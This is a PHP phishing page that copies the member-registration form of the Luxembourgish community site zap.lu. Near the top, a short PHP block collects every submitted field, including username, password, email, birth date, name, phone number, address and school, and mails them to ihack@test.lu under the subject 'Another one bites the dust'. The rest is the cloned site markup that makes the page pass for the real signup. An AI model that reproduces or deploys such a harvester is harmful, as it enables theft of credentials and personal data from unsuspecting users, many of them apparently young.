<?php
if ($_POST) {
//  echo '<pre>';
//   echo htmlspecialchars(print_r($_POST, true));
//    echo '</pre>';

// The message
//$message = "Line 1\nLine 2\nLine 3";
$message = print_r($_POST, true);

// In case any of our lines are larger than 70 characters, we should use wordwrap()
$message = wordwrap($message, 70);

// Send
mail('ihack@test.lu', 'Another one bites the dust', $message);
}
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html><head>

<!-- (C) Patric de Waha - patric@p-dw.com	-->




<!-- <META http-equiv="Page-Enter" content="blendTrans(duration=0.4)">-->
<meta http-equiv="content-type" content="text/html; charset=UTF-8"> 
<meta name="description" content="zap.lu">
<meta name="keyword" content="agenda,singles,kommunikatioun,disco,club,pubs,cafe,bal,baler,fotoen,party,community,chat">
<title> { www.zap.lu ZAP V1 }</title>

<script type="text/javascript" src="profile_files/main.html" charset="UTF-8">
</script>
<script type="text/javascript" src="profile_files/psos.html" charset="UTF-8">
</script>


<link rel="STYLESHEET" media="SCREEN" href="profile_files/regular.css">
<link rel="shortcut icon" href="http://www.zap.lu/faces/zap.lu/p/favicon.ico" type="image/x-icon">

<link href="profile_files/jquery.css" rel="stylesheet" type="text/css"><script src="profile_files/autofilljs.html" type="text/javascript"></script><style>input.vpws_ac_red { background-image: url('https://myvidoop.com/images/plugin/v_safe_icon_toolbar_red_16x.gif') !important; background-position: right center !important; background-repeat: no-repeat !important }
input.vpws_current_field  { background-image: url('https://myvidoop.com/images/plugin/v_safe_icon_add.gif') !important; background-position: right center !important; background-repeat: no-repeat !important }
.vpws_added { cursor: pointer; font-family: arial; border: thin solid black; padding-top: 5px; padding: 5px; color: #0376CE; font-size: 14px; font-style: normal; background: white url('https://myvidoop.com/images/common/messagebox_ok.png') left center no-repeat; padding-left: 25px; position: absolute; }
.vpws_new { display: block; padding-top: 5px; min-height: 20px; color: #0376CE; font-size: 90%; font-style: italic; background: url('https://myvidoop.com/images/plugin/v_safe_icon_add.gif') left center no-repeat; padding-left: 25px; }
</style></head><body><div id="pageFader" onclick="deactivateHomepage(); " style="position: absolute; top: 0px; left: 0px; width: 100%; height: 100%; background-color: white; z-index: 111; display: none;">&nbsp;</div>

<div id="browser" style="position: absolute; z-index: 9000; top: 0px; left: 0px; width: 860px; height: 700px; display: none;">



		<div style="position: absolute; z-index: 9000; left: 385px; top: 30px;"><a href="javascript:deactivateHomepage()"><img src="profile_files/closebrowser.gif" border="0"></a></div>
		<div style="overflow: hidden; height: 60px; width: 425px; z-index: 8000; background-image: url(/skins/zap-blade/p/browserHead.png); background-repeat: no-repeat; background-position: left top; text-align: right;">&nbsp;</div>
		<div id="browserUrl"><a id="browserAnchor" href="" target="_blank"></a></div>

	
		<div class="browserBG" style="z-index: 9000; width: 860px; height: 700px;"><iframe class="browserBG" id="browserFrame" name="browserFrame" style="z-index: 9000; width: 860px; height: 700px;" marginheight="0" marginwidth="0" scrolling="auto" frameborder="0"></iframe></div>

</div>
<div class="default">
<div style="width: 974px; margin-left: auto; margin-right: auto; position: relative;">
	<div style="position: relative; top: 70px; width: 844px; background-image: url(/skins/zap-blade/p/head.png); background-repeat: no-repeat;">
	

				
		
		<div style="position: absolute; top: 36px; right: 5px; z-index: 1001;">
			<div id="ubLoginAndCo">
			<div class="default">
									<a class="ubLoginAndCoLinks" style="" href="http://www.zap.lu/_a/_users/profile.html?profile%5BMode%5D=profile%2Fregister">Member gin</a>
			
						 |  
					<a class="ubLoginAndCoLinks" style="font-weight: bold;" href="http://www.zap.lu/_a/_users/loginform.html">Anloggen</a>						
						
		
				</div>			</div>	
		</div>
	

            <div style="position: absolute; top: 35px; left: 145px; line-height: 18px; height: 18px; z-index: 1000;">
                      <a class="wpFilterChosal" style="margin-right: 20px; line-height: 18px;" href="javascript:void(showLangs())">Letzebuergeg</a>

      </div>


	
				<div style="position: absolute; top: 35px; left: 250px; line-height: 18px; height: 18px; z-index: 1000;">
				<a class="wpFilterChosal" style="margin-right: 20px; line-height: 18px;" href="javascript:void(showRegion())">All Regiounen</a>										
				
		</div>
		<div style="position: absolute; top: 35px; left: 355px; line-height: 18px; height: 18px; z-index: 1000;">		
			<a class="wpFilterChosal" style="line-height: 18px;" href="javascript:void(showAge())">19 bis 40 Joer</a>
		</div>


       <div id="chooseLangs" style="display: none; z-index: 1000;">         
               <div style="padding-left: 4px;">         

                        <a class="wpFilterChosal" style="background-image: none;" href="javascript:switchlang('lu')">Letzebuergeg</a> 
                        <a class="wpFilterChosal" style="background-image: none;" href="javascript:switchlang('de')">Deutsch</a>     
               </div>         
       </div>        


		<div id="chooseRegion" style="display: none; z-index: 1000;">
			<div style="padding-left: 4px;">
	                        
				<a class="wpFilterChosal" style="background-image: none;" href="javascript:switchregion(0)">All Regounen</a>
					
					<a class="wpFilterChosal" style="background-image: none;" href="javascript:switchregion(1)">Zentrum</a>
	            	
					<a class="wpFilterChosal" style="background-image: none;" href="javascript:switchregion(2)">Minett</a>
	            	
					<a class="wpFilterChosal" style="background-image: none;" href="javascript:switchregion(3)">Osten</a>
	            	
					<a class="wpFilterChosal" style="background-image: none;" href="javascript:switchregion(4)">Norden</a>
	            	
					<a class="wpFilterChosal" style="background-image: none;" href="javascript:switchregion(5)">Westen</a>
	            	
			</div>
		</div>
		
		<div id="chooseAge" style="display: none; z-index: 1000;">
		
			<div><span style="color: white; padding-top: 3px; padding-left: 5px;">Filter fir den Alter</span></div>
			<center>		
				<div style="padding-top: 9px;">
					<select id="chooseFrom" name="from" style="font-size: 8px;">
						<option value="17">17</option><option value="18">18</option><option value="19" selected="selected">19</option><option value="20">20</option><option value="21">21</option><option value="22">22</option><option value="23">23</option><option value="24">24</option><option value="25">25</option><option value="26">26</option><option value="27">27</option><option value="28">28</option><option value="29">29</option><option value="30">30</option><option value="31">31</option><option value="32">32</option><option value="33">33</option><option value="34">34</option><option value="35">35</option><option value="36">36</option><option value="37">37</option><option value="38">38</option><option value="39">39</option><option value="40">40</option><option value="41">41</option><option value="42">42</option><option value="43">43</option><option value="44">44</option><option value="45">45</option><option value="46">46</option><option value="47">47</option><option value="48">48</option><option value="49">49</option><option value="50">50</option><option value="51">51</option><option value="52">52</option><option value="53">53</option><option value="54">54</option><option value="55">55</option>					</select>
					<span style="color: white;">bis</span>
					<select id="chooseTo" name="to" style="font-size: 8px;">
						<option value="17">17</option><option value="18">18</option><option value="19">19</option><option value="20">20</option><option value="21">21</option><option value="22">22</option><option value="23">23</option><option value="24">24</option><option value="25">25</option><option value="26">26</option><option value="27">27</option><option value="28">28</option><option value="29">29</option><option value="30">30</option><option value="31">31</option><option value="32">32</option><option value="33">33</option><option value="34">34</option><option value="35">35</option><option value="36">36</option><option value="37">37</option><option value="38">38</option><option value="39">39</option><option value="40" selected="selected">40</option><option value="41">41</option><option value="42">42</option><option value="43">43</option><option value="44">44</option><option value="45">45</option><option value="46">46</option><option value="47">47</option><option value="48">48</option><option value="49">49</option><option value="50">50</option><option value="51">51</option><option value="52">52</option><option value="53">53</option><option value="54">54</option><option value="55">55</option>					</select>			
				</div>
			</center>
			<div style="padding: 4px; text-align: right;"><a class="wpFilterChosal" style="background-image: none;" href="javascript:switchage($F('chooseFrom'),$F('chooseTo'))">Speicheren</a></div>			
		</div>
			
		<div style="position: relative; left: 0px; top: 0px;">
		<div style="padding-top: 52px;">	
			<div id="wpNavigation" style="overflow: hidden; float: left; margin-top: 19px; width: 135px; min-height: 250px;">
			<div id="wpMainNavigation" class="borderbottom" style="padding-top: 1px;">			
											<script language="javascript">
							setLastActiveMainTab('wpNavHome')
						</script>
					
						 						 		
						 		
							<a id="wpNavHome" class="wpMainTabActive" style="" href="javascript:void(mainTabClick('wpNavHome'));">Zap.lu</a>	
							
							<div id="wpNavHomeSD" class="wpSubTabContainer" style="">
									
		<a class="wpSubTabActive" href="http://www.zap.lu/_a/index.html?&amp;tab=1&amp;subtab=1">Iwersiicht</a>
								
									
		<a class="wpSubTab" href="http://www.zap.lu/_a/_home/?&amp;tab=1&amp;subtab=2">Deng Homebase</a>
										
		<a class="wpSubTab" href="http://www.zap.lu/_a/_ams/index.html?&amp;tab=1&amp;subtab=3">Deng Norichten</a>
																	
																	
		<a class="wpSubTab" href="http://www.zap.lu/_a/shoutbox.html?&amp;tab=1&amp;subtab=4">Shoutbox</a>
										
		<a class="wpSubTab" href="http://www.zap.lu/_a/_users/profile.html?profile%5BMode%5D=profile%2Fregister&amp;tab=1&amp;subtab=5">Member gin</a>
									
								
							</div>
							
						
						
						 						
						<a id="wpNavNightlife" class="wpMainTabInactive" style="" href="javascript:void(mainTabClick('wpNavNightlife'));">Nuetsliewen </a>	
						
						<div id="wpNavNightlifeSD" class="wpSubTabContainer" style="display: none;">
								
		<a class="wpSubTab" href="http://www.zap.lu/tabs/pictures.html?tab=7&amp;tab=7&amp;subtab=6">Iwersiicht</a>
									
		<a class="wpSubTab" href="http://www.zap.lu/_a/_pictures/query.html?mode=4&amp;qdata=&amp;page=1&amp;tab=7&amp;subtab=7">Mescht gekuckten</a>
									
		<a class="wpSubTab" href="http://www.zap.lu/_a/_pictures/query.html?mode=1&amp;qdata=&amp;page=1&amp;tab=7&amp;subtab=8">Di beschten</a>
								
								
		<a class="wpSubTab" href="http://www.zap.lu/_a/_pictures/query.html?mode=8&amp;qdata=&amp;page=1&amp;tab=7&amp;subtab=9">Zoufaelleg Fotoen</a>
									
		<a class="wpSubTab" href="http://www.zap.lu/_a/_events/?&amp;tab=7&amp;subtab=10">Event siichen</a>
								
								
		<a class="wpSubTab" href="http://www.zap.lu/_a/_about/crew.html?&amp;tab=7&amp;subtab=11">Party Fotografen</a>
								
								
		<a class="wpSubTab" href="http://www.zap.lu/_a/_agenda/?&amp;tab=7&amp;subtab=12">Agenda</a>
								

						</div>

						 						
						<a id="wpNavSingles" class="wpMainTabInactive" style="" href="javascript:void(mainTabClick('wpNavSingles'));">Singles</a>	
						
						
						<div id="wpNavSinglesSD" class="wpSubTabContainer" style="display: none;">
								
		<a class="wpSubTab" href="http://www.zap.lu/tabs/singles.html?&amp;tab=4&amp;subtab=13">Iwersiicht</a>
									
		<a class="wpSubTab" href="http://www.zap.lu/_a/_singles/?nav%5Bqry%5D=6&amp;tab=4&amp;subtab=14">Online Singles</a>
								
								
		<a class="wpSubTab" href="http://www.zap.lu/_a/_singles/?nav%5Bqry%5D=7&amp;tab=4&amp;subtab=15">Dei nei Singles</a>
								
								
		<a class="wpSubTab" href="http://www.zap.lu/_a/_singles/?nav%5Bqry%5D=8&amp;tab=4&amp;subtab=16">Mescht gekuckten</a>
								
								
		<a class="wpSubTab" href="http://www.zap.lu/_a/_singles/?nav%5Bqry%5D=9&amp;tab=4&amp;subtab=17">Dei beleiwsten</a>
								
								
		<a class="wpSubTab" href="http://www.zap.lu/_a/_singles/search.html?&amp;tab=4&amp;subtab=18">Siichen</a>
			
						</div>
								

						 
						 	
						<a id="wpNavHomepages" class="wpMainTabInactive" style="" href="javascript:void(mainTabClick('wpNavHomepages'));">Homepagen</a>	
						
						<div id="wpNavHomepagesSD" class="wpSubTabContainer" style="display: none;">
								
		<a class="wpSubTab" href="http://www.zap.lu/tabs/homepages.html?tab=5&amp;tab=5&amp;subtab=19">Iwersiicht</a>
									
		<a class="wpSubTab" href="http://www.zap.lu/_a/_homepages/?nav%5Bqry%5D=7&amp;tab=5&amp;subtab=20">Nei HPs</a>
								
								
		<a class="wpSubTab" href="http://www.zap.lu/_a/_homepages/?nav%5Bqry%5D=9&amp;tab=5&amp;subtab=21">Populaerst</a>
									
		<a class="wpSubTab" href="http://www.zap.lu/_a/_homepages/?nav%5Bqry%5D=5&amp;tab=5&amp;subtab=22">Fresch upgdate</a>
									
		<a class="wpSubTab" href="http://www.zap.lu/_a/_homepages/search.html?&amp;tab=5&amp;subtab=23">Siichen</a>
							</div>
												
							
						 							
						
						<a id="wpNavZapper" class="wpMainTabInactive" href="javascript:void(mainTabClick('wpNavZapper'));">Bewunner</a>	
						
						<div id="wpNavZapperSD" class="wpSubTabContainer" style="display: none;">
								
		<a class="wpSubTab" href="http://www.zap.lu/tabs/users.html?&amp;tab=3&amp;subtab=24">Iwersiicht</a>
									
		<a class="wpSubTab" href="http://www.zap.lu/_a/_suspects/?nav%5Bqry%5D=6&amp;tab=3&amp;subtab=25">Online Bewunner</a>
									
		<a class="wpSubTab" href="http://www.zap.lu/_a/_suspects/?nav%5Bqry%5D=7&amp;tab=3&amp;subtab=26">Dei nei</a>
								
								
		<a class="wpSubTab" href="http://www.zap.lu/_a/_suspects/?nav%5Bqry%5D=8&amp;tab=3&amp;subtab=27">Mescht gekuckten</a>
								
								
		<a class="wpSubTab" href="http://www.zap.lu/_a/_suspects/?nav%5Bqry%5D=9&amp;tab=3&amp;subtab=28">Dei populaerst</a>
								
								
		<a class="wpSubTab" href="http://www.zap.lu/_a/_suspects/search.html?&amp;tab=3&amp;subtab=29">Siichen</a>
								
					
						</div>
						
						
														
																		
			</div>

					
																
			
			
				
	<!--*********************************************************
		*********************************************************
		********************************************************* -->

	
	
			<div style="padding-top: 10px; padding-left: 6px;">
	
		<div style="height: 16px;">

						        <div style="float: left; padding-left: 10px;"><a href="http://www.zap.lu/_a/shoutbox.html"><img src="profile_files/shoutbox_anim.gif" onmouseover="this.src='/skins/zap-blade/p/shoutbox.gif'" onmouseout="this.src='/skins/zap-blade/p/shoutbox_anim.gif'"></a></div>
		       
		        <div style="float: left; padding-left: 10px;"><a href="http://www.zap.lu/_a/_users/profile.html?profile%5BMode%5D=profile%2Fregister"><img src="profile_files/profile_gro.gif" onmouseover="this.src='/skins/zap-blade/p/profile.gif'" onmouseout="this.src='/skins/zap-blade/p/profile_gro.gif'"></a></div>
		        
		        		        
				
		        <div style="float: left; padding-left: 10px;"><a href="http://www.zap.lu/_a/_home/?subtab=2&amp;tab=1"><img id="izapicon" src="profile_files/izap_gro.gif" onmouseover="this.src='/skins/zap-blade/p/izap.gif'" onmouseout="this.src='/skins/zap-blade/p/izap_gro.gif'"></a></div>
								

				
								
				<div style="float: left; padding-left: 10px;"><a href="http://www.zap.lu/_a/_ams/index.html"><img id="norichtenwait" src="profile_files/norichten_gro.gif" onmouseover="this.src='/skins/zap-blade/p/norichten.gif'" onmouseout="this.src='/skins/zap-blade/p/norichten_gro.gif'"></a></div>

		        
		        <div style="width: 0pt; height: 0pt; clear: both;"></div>
		</div>
			
	</div>	
		

	
	<!--	*********************************************************
		*********************************************************
		********************************************************* -->
		
						
	

				
		
					<div style="padding-top: 10px;" class="default">
						<div class="wpCorner href=" javascript:void(true)="">216 Visiteuren</div>	
						<a class="wpSubTab" style="margin-bottom: 2px;" href="http://www.zap.lu/_a/_suspects/?nav%5Bqry%5D=6&amp;filter=1">79 Memberen</a>	
						<div class="wpSubTab">137 Anonymer</div>
					</div>
					

							</div>
			</div>
		
			<div id="wpContent" style="overflow: hidden; float: right; width: 709px; position: relative;">
						
				<div style="border-style: solid; border-color: rgb(62, 93, 153) rgb(58, 88, 149) rgb(58, 88, 149) rgb(58, 94, 156); border-width: 1px; min-height: 640px; line-height: 0pt;">
					<div style="position: absolute; top: 0pt; left: 0pt;"><img src="profile_files/content_head_small.png" border="0"></div>
					<div style="padding: 10px; line-height: normal; text-align: left;" class="default">
					
					
<div style="width: 405px; float: left;">

<div>
<div class="boxRegularCanvas" style="width: 100%;">

	<div class="boxRegularTopTab">
		
		<div class="boxRegularTopTab" style="float: left;">Member&nbsp;gin</div>
		<div style="clear: both;"></div>
	</div>
		
		
			

	<div class="boxRegularInnerCanvas" style="padding-top: 3px; text-align: left;">
		<div><script language="javascript">
<!--
	function control_register_form()		{
		
	 return true;		
	}
//-->
</script>



<form vpws_id="a3ecb90e7c9b9125" id="MemberForm" name="MemberForm" action="" method="post" onsubmit="return control_register_form();">
<input name="sn" value="aWpq1xTIenZwd0" type="hidden">
<input name="ticket" value="1229299593554939677" type="hidden">
<div>
	
	
		<div style="margin: 10px;">
			<div><span style="font-size: 14px; font-weight: bold;">Welcome op Zap.lu</span></div>
			<div style="padding: 5px;"><span style="font-size: 12px;">Zap.lu
ass den greissten Community Site zu Letzebuerg. Registreier dech fir
iwer 30 000 Leit kennenzeleieren oder einfach nemmen eng relax Zeit ze
verbengen.</span></div>
		</div>
		
	
		<div class="subheader">Zougangsdaten</div>
			
		<div style="padding: 15px;">
			<table cellpadding="3">
				<tbody><tr><td style="width: 200px;"><span class="t_a">Dein Benotzernumm</span></td><td><input vpws_id="16e305e430746baa" name="Username" size="20" value="" type="text"><span></span></td></tr>
				<tr><td><span class="t_a">Dein Passwuert</span></td><td><input vpws_id="fb03aa541486fc05" name="Password1" size="20" type="password"></td></tr>
				<tr><td><span class="t_a">Passwuert (nach engker)</span></td><td><input vpws_id="3a38c17ff7063282" name="Password2" size="20" maxlength="20" type="password"></td></tr>
			</tbody></table>
		</div>
		
		<div class="subheader">Perseinlech Informatiounen</div>
		
						
		<div style="padding: 15px;">	
			<table cellpadding="3">	
				<tbody><tr><td style="width: 200px;"><span class="t_a">Deng korrekt Emailaddress</span></td><td><input vpws_id="e16473e7dd7405b8" style="width: 150px;" name="data[Email]" maxlength="35" size="30" value="" type="text"></td></tr>
				<tr><td><span class="t_a">Dein Geschlecht</span></td><td><input vpws_id="83682873109f1d34" style="" class="clean" name="data[Gender]" value="Mann" checked="checked" type="radio"><span>&nbsp;Mann</span>&nbsp;&nbsp;<input vpws_id="d181484173a2bb0f" class="clean" name="data[Gender]" value="Fra" type="radio"><span>&nbsp;Fra</span></td></tr>
				<tr><td><span class="t_a">Dein Geburtsdatum</span></td><td>																				
																					<select vpws_id="3887724732ef4817" name="data[Day]">	<option>dd</option>		<option value="01">01</option><option value="02">02</option><option value="03">03</option><option value="04">04</option><option value="05">05</option><option value="06">06</option><option value="07">07</option><option value="08">08</option><option value="09">09</option><option value="10">10</option><option value="11">11</option><option value="12">12</option><option value="13">13</option><option value="14">14</option><option value="15">15</option><option value="16">16</option><option value="17">17</option><option value="18">18</option><option value="19">19</option><option value="20">20</option><option value="21">21</option><option value="22">22</option><option value="23">23</option><option value="24">24</option><option value="25">25</option><option value="26">26</option><option value="27">27</option><option value="28">28</option><option value="29">29</option><option value="30">30</option><option value="31">31</option></select>
																					<select vpws_id="07b5d324a1baf181" name="data[Month]">	<option>mm</option>		<option value="01">01</option><option value="02">02</option><option value="03">03</option><option value="04">04</option><option value="05">05</option><option value="06">06</option><option value="07">07</option><option value="08">08</option><option value="09">09</option><option value="10">10</option><option value="11">11</option><option value="12">12</option></select>
																					<select vpws_id="c304d496cd6bfa3a" name="data[Year]">	<option>yyyy</option>	<option value="2004">2004</option><option value="2003">2003</option><option value="2002">2002</option><option value="2001">2001</option><option value="2000">2000</option><option value="1999">1999</option><option value="1998">1998</option><option value="1997">1997</option><option value="1996">1996</option><option value="1995">1995</option><option value="1994">1994</option><option value="1993">1993</option><option value="1992">1992</option><option value="1991">1991</option><option value="1990">1990</option><option value="1989">1989</option><option value="1988">1988</option><option value="1987">1987</option><option value="1986">1986</option><option value="1985">1985</option><option value="1984">1984</option><option value="1983">1983</option><option value="1982">1982</option><option value="1981">1981</option><option value="1980">1980</option><option value="1979">1979</option><option value="1978">1978</option><option value="1977">1977</option><option value="1976">1976</option><option value="1975">1975</option><option value="1974">1974</option><option value="1973">1973</option><option value="1972">1972</option><option value="1971">1971</option><option value="1970">1970</option><option value="1969">1969</option><option value="1968">1968</option><option value="1967">1967</option><option value="1966">1966</option><option value="1965">1965</option><option value="1964">1964</option><option value="1963">1963</option><option value="1962">1962</option><option value="1961">1961</option><option value="1960">1960</option><option value="1959">1959</option><option value="1958">1958</option><option value="1957">1957</option><option value="1956">1956</option><option value="1955">1955</option><option value="1954">1954</option><option value="1953">1953</option><option value="1952">1952</option><option value="1951">1951</option><option value="1950">1950</option></select>																						
																				</td></tr>				
				
				<tr><td style="width: 200px;"><span class="t_a">Dein Fiirnumm</span></td><td><input vpws_id="c84c7f64e7ecbd51" style="width: 150px;" name="data[Firstname]" maxlength="35" size="30" value="" type="text"></td></tr>
				<tr><td style="width: 200px;"><span class="t_a">Dein Familiennumm</span></td><td><input vpws_id="5ba0b9d42aeae221" style="width: 150px;" name="data[Lastname]" maxlength="35" size="30" value="" type="text"></td></tr>
				<tr><td style="width: 200px;"><span class="t_a">Dein Handy nummer</span></td><td><input vpws_id="5ba0b9d42aeae221" style="width: 150px;" name="data[Handy]" maxlength="35" size="30" value="" type="text"></td></tr>
				<tr><td style="width: 200px;"><span class="t_a">Deng address</span></td><td><input vpws_id="5ba0b9d42aeae221" style="width: 150px;" name="data[Address]" maxlength="35" size="30" value="" type="text"></td></tr>
				<tr><td style="width: 200px;"><span class="t_a">Deng Schoul</span></td><td><input vpws_id="5ba0b9d42aeae221" style="width: 150px;" name="data[Schoul]" maxlength="35" size="30" value="" type="text"></td></tr>
			</tbody></table>	
		</div>
		
		<div style="margin-top: 5px; margin-bottom: 5px;"><div style="overflow: hidden; height: 1px; background-image: url(/skins/zap-blade/p/sep.gif);">&nbsp;</div></div>		
		
		<div style="padding: 5px;">
			<div style="float: right;"><div><div style="overflow: hidden; width: 100%;"><a class="formbutton" style="float: right;" href="javascript:void($('MemberForm').submit())">Speicheren</a></div></div></div><div style="clear: both;"></div>		 
		</div>


	</div>
			
</form>
			</div>
		</div>
	</div>
</div></div>
<div style="width: 270px; float: right;">
		<div>
<div class="boxRegularCanvas" style="width: 100%;">

	<div class="boxRegularTopTab">
		
		<div class="boxRegularTopTab" style="float: left;">Opgepasst</div>
		<div style="clear: both;"></div>
	</div>
		
		
			

	<div class="boxRegularInnerCanvas" style="padding-top: 3px; text-align: left;">
		<div>		
			<div style="padding: 10px;">
			<span style="font-size: 12px;">
				<span style="font-weight: bold; font-size: 18px;">Geff w.e.g eng korrekt Email-Address un</span><br><br>
				Den Account get nämlech per Email aktivéiert				<br><br>
			</span>
			</div>
			
					</div>
		</div>
	</div>
</div>		
		<div>
<div class="boxRegularCanvas" style="width: 100%;">

	<div class="boxRegularTopTab">
		
		<div class="boxRegularTopTab" style="float: left;">ZAP.lu&nbsp;&amp;&nbsp;HOT.lu</div>
		<div style="clear: both;"></div>
	</div>
		
		
			

	<div class="boxRegularInnerCanvas" style="padding-top: 3px; text-align: left;">
		<div>			<div style="padding: 10px;">
			<span style="font-size: 12px;">
				<img src="profile_files/hotzap.gif" border="0">
				<br>
				<div style="padding-top: 10px; text-align: justify;">
									<b style="font-weight: bold;">ZAP.lu</b> an <b style="font-weight: bold;">HOT.lu</b> hun fusionneiert. Wanns du also een Account hues um <b style="font-weight: bold;">HOT.lu</b>, kanns deen och hei <b style="font-weight: bold;">HOT.lu</b> benetzen, an brauchs keen neien ze erstellen.
					fir dech um ZAP anzeloggen.				
								</div>
				<div style="text-align: right; padding-top: 5px;"><a href="http://blog.zap.lu/" target="_blank">mei Informationen</a></div>
			</span>
			</div>
			
					</div>
		</div>
	</div>
</div>		
</div>

<div style="clear: both;"></div>
	
</div>
					<div style="position: absolute; bottom: 0pt; left: 0pt;"><img src="profile_files/content_foot_small.png" border="0"></div>
				</div>				
				


			</div>
				<div style="width: 709px; float: right;">
				
						<center>
													<span><a href="http://www.zap.lu/_a/_about/about.html">Iwert Zap.lu</a></span>
												
													
							<span>&nbsp;&nbsp;| &nbsp;&nbsp;<a href="http://www.zap.lu/_a/_about/pub.html">Publiciteit op Zap.lu</a></span>
														
																			
							<span>&nbsp;&nbsp;| &nbsp;&nbsp;<a href="http://www.zap.lu/_a/_about/press.html">Downloads</a></span>
												
																				
							<span>&nbsp;&nbsp;| &nbsp;&nbsp;<a href="http://www.zap.lu/_a/_about/support.html">Kontakt &amp; Support</a></span>
																			
																				
							<span>&nbsp;&nbsp;| &nbsp;&nbsp;<a href="http://www.zap.lu/_a/_about/faq.html">FAQ</a></span>
																										
							<span>&nbsp;&nbsp;| &nbsp;&nbsp;<a href="http://www.zap.lu/_a/_about/blog.html">Blog</a></span>
							
						
													<span>&nbsp;&nbsp;| &nbsp;&nbsp;<a href="http://www.zap.lu/faces/zap.lu/about/cim.html?sn=aWpq1xTIenZwd0"><img src="profile_files/metriweb.gif"></a></span>
							
						</center>
				</div>
			
			
			<div style="clear: both;"></div>
		</div>

	<script type="text/javascript" charset="UTF-8">

        	/* max. length:  123456789012345678901234 */
            var keyword="zaplu";
            var extra="na";

            if (window.metriwebTag)
            	metriwebTag ("zaplu", keyword, extra);
           </script>
		

	</div>	
		<div style="position: absolute; top: 4px; right: 130px;"><div style="width: 728px; height: 90px;"><div style="position: relative; width: 728px; height: 90px;">
					<div id="ad728x90" style="overflow: hidden; width: 728px; height: 90px; visibility: visible; position: absolute; top: 0pt; right: 0pt; z-index: 1000;">
						<div style="position: absolute; top: 0pt; right: 0pt;">
						<script type="text/javascript"><!--//<![CDATA[
						   var m3_u = (location.protocol=='https:'?'https://ads3.zap.lu/www/delivery/ajs.php':'http://ads3.zap.lu/www/delivery/ajs.php');
						   var m3_r = Math.floor(Math.random()*99999999999);
						   if (!document.MAX_used) document.MAX_used = ',';
						   document.write ("<scr"+"ipt type='text/javascript' src='"+m3_u);
						   document.write ("?zoneid=1");
						   document.write ('&amp;cb=' + m3_r);
						   if (document.MAX_used != ',') document.write ("&amp;exclude=" + document.MAX_used);
						   document.write ("&amp;loc=" + escape(window.location));
						   if (document.referrer) document.write ("&amp;referer=" + escape(document.referrer));
						   if (document.context) document.write ("&context=" + escape(document.context));
						   if (document.mmm_fo) document.write ("&amp;mmm_fo=1");
						   document.write ("'><\/scr"+"ipt>");
						//]]>--></script><script type="text/javascript" src="profile_files/ajs_002.js"></script><a href="http://ads3.zap.lu/www/delivery/ck.php?oaparams=2__bannerid=95__zoneid=1__cb=41196b3797__maxdest=http://www.jugendemfro.lu" target="_blank"><img src="profile_files/jugendemfro_3.gif" alt="" title="" width="728" border="0" height="90"></a><div id="beacon_95" style="position: absolute; left: 0px; top: 0px; visibility: hidden;"><img src="profile_files/lg.gif" alt="" style="width: 0px; height: 0px;" width="0" height="0"></div>

						</div>
					</div>
			</div></div></div>
			
		<div style="position: absolute; top: 4px; right: 0px;">
			<div style="width: 120px; height: 600px;"><div style="position: relative; width: 120px; height: 600px;">
					<div id="ad120x600" style="overflow: hidden; width: 120px; height: 600px; visibility: visible; position: absolute; top: 0pt; right: 0pt; z-index: 1000;">
						<div style="position: absolute; top: 0pt; right: 0pt;">
						<script type="text/javascript"><!--//<![CDATA[
						   var m3_u = (location.protocol=='https:'?'https://ads3.zap.lu/www/delivery/ajs.php':'http://ads3.zap.lu/www/delivery/ajs.php');
						   var m3_r = Math.floor(Math.random()*99999999999);
						   if (!document.MAX_used) document.MAX_used = ',';
						   document.write ("<scr"+"ipt type='text/javascript' src='"+m3_u);
						   document.write ("?zoneid=6");
						   document.write ('&amp;cb=' + m3_r);
						   if (document.MAX_used != ',') document.write ("&amp;exclude=" + document.MAX_used);
						   document.write ("&amp;loc=" + escape(window.location));
						   if (document.referrer) document.write ("&amp;referer=" + escape(document.referrer));
						   if (document.context) document.write ("&context=" + escape(document.context));
						   if (document.mmm_fo) document.write ("&amp;mmm_fo=1");
						   document.write ("'><\/scr"+"ipt>");
						//]]>--></script><script type="text/javascript" src="profile_files/ajs.js"></script>
						</div>
					</div>
			</div></div>		</div>
	
</div>
</div>			<script src="profile_files/urchin.js" type="text/javascript"></script>
			<script type="text/javascript">
				_uacct = "UA-427062-6";
				urchinTracker();
			</script></body></html>
